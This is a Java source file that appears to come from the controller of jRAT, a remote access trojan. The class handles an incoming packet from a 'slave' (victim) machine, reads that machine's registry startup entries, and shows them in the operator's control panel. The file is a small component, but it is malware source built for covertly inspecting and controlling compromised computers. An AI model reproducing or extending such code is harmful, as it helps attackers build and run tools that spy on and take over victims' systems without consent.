package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FrameControlPanel;
import se.jrat.controller.ui.panels.PanelControlRegStart;


public class Packet53RegistryStartup extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int count = slave.readInt();
		String[] args = new String[count];
		for (int i = 0; i < count; i++) {
			args[i] = slave.readLine();
		}

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null && count == 3) {
			PanelControlRegStart panel = (PanelControlRegStart) frame.panels.get("registry startup");
			panel.getModel().addRow(new Object[] { PanelControlRegStart.ICON, args[0], args[1], args[2] });
		}
	}

}